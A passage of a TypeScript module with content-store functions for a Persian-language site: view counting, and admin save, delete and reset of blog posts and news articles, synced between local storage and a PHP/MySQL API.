      newsArticles: finalNews,
      source: "mysql",
    };
  }

  return {
    blogPosts: local.blogPosts,
    newsArticles: local.newsArticles,
    source: "local",
  };
}

export async function incrementContentView(contentType: "blog" | "news", id: string): Promise<void> {
  const local = getLocalContentStore();
  if (contentType === "blog") {
    const updated = local.blogPosts.map((p) => (p.id === id ? { ...p, views: (p.views || 0) + 1 } : p));
    saveLocalContentStore(updated, local.newsArticles);
  } else {
    const updated = local.newsArticles.map((n) => (n.id === id ? { ...n, views: (n.views || 0) + 1 } : n));
    saveLocalContentStore(local.blogPosts, updated);
  }
  await callContentApi("view", "POST", { contentType, id });
}

export async function adminSaveBlogPost(post: BlogPost): Promise<{
  ok: boolean;
  message: string;
  error?: string;
  blogPosts: BlogPost[];
}> {
  const local = getLocalContentStore();
  let updatedList = [...local.blogPosts];
  if (post.isFeatured) {
    updatedList = updatedList.map((p) => (p.id === post.id ? p : { ...p, isFeatured: false }));
  }
  const existsIdx = updatedList.findIndex((p) => p.id === post.id);
  if (existsIdx >= 0) {
    updatedList[existsIdx] = post;
  } else {
    updatedList.unshift(post);
  }
  saveLocalContentStore(updatedList, local.newsArticles);

  const res = await callContentApi<{ ok?: boolean; message?: string; error?: string }>("save_blog", "POST", {
    post,
  });

  if (res.isPhpAvailable && !res.ok) {
    const errMsg = res.data?.error || "خطا در ذخیره مقاله در دیتابیس";
    return { ok: false, message: errMsg, error: errMsg, blogPosts: updatedList };
  }

  return {
    ok: true,
    message: res.data?.message || "مقاله وبلاگ با موفقیت در دیتابیس ذخیره و منتشر شد.",
    blogPosts: updatedList,
  };
}

export async function adminDeleteBlogPost(postId: string): Promise<{
  ok: boolean;
  message: string;
  blogPosts: BlogPost[];
}> {
  const local = getLocalContentStore();
  const updatedList = local.blogPosts.filter((p) => p.id !== postId);
  saveLocalContentStore(updatedList, local.newsArticles);

  await callContentApi("delete_blog", "POST", { id: postId });
  return {
    ok: true,
    message: "مقاله وبلاگ حذف شد.",
    blogPosts: updatedList,
  };
}

export async function adminSaveNewsArticle(article: NewsArticle): Promise<{
  ok: boolean;
  message: string;
  error?: string;
  newsArticles: NewsArticle[];
}> {
  const local = getLocalContentStore();
  const updatedList = [...local.newsArticles];
  const existsIdx = updatedList.findIndex((n) => n.id === article.id);
  if (existsIdx >= 0) {
    updatedList[existsIdx] = article;
  } else {
    updatedList.unshift(article);
  }
  saveLocalContentStore(local.blogPosts, updatedList);

  const res = await callContentApi<{ ok?: boolean; message?: string; error?: string }>("save_news", "POST", {
    article,
  });

  if (res.isPhpAvailable && !res.ok) {
    const errMsg = res.data?.error || "خطا در ذخیره خبر در دیتابیس";
    return { ok: false, message: errMsg, error: errMsg, newsArticles: updatedList };
  }

  return {
    ok: true,
    message: res.data?.message || "خبر / هشدار امنیتی با موفقیت در دیتابیس ذخیره شد.",
    newsArticles: updatedList,
  };
}

export async function adminDeleteNewsArticle(articleId: string): Promise<{
  ok: boolean;
  message: string;
  newsArticles: NewsArticle[];
}> {
  const local = getLocalContentStore();
  const updatedList = local.newsArticles.filter((n) => n.id !== articleId);
  saveLocalContentStore(local.blogPosts, updatedList);

  await callContentApi("delete_news", "POST", { id: articleId });
  return {
    ok: true,
    message: "گزارش خبری حذف شد.",
    newsArticles: updatedList,
  };
}

export async function adminResetDefaultContent(): Promise<{
  ok: boolean;
  message: string;
  blogPosts: BlogPost[];
  newsArticles: NewsArticle[];
}> {
  saveLocalContentStore(DEFAULT_BLOG_POSTS, DEFAULT_NEWS_ARTICLES);
  await callContentApi("reset_defaults", "POST", {
    blogPosts: DEFAULT_BLOG_POSTS,
    newsArticles: DEFAULT_NEWS_ARTICLES,
  });
  return {
    ok: true,
    message: "مقالات و اخبار پیش‌فرض با موفقیت بازنشانی شدند.",
    blogPosts: DEFAULT_BLOG_POSTS,
    newsArticles: DEFAULT_NEWS_ARTICLES,
  };
}

export const saveBlogPostToStore = adminSaveBlogPost;
export const deleteBlogPostFromStore = adminDeleteBlogPost;
export const saveNewsArticleToStore = adminSaveNewsArticle;
export const deleteNewsArticleFromStore = adminDeleteNewsArticle;
export const resetContentStoreToDefaults = adminResetDefaultContent;

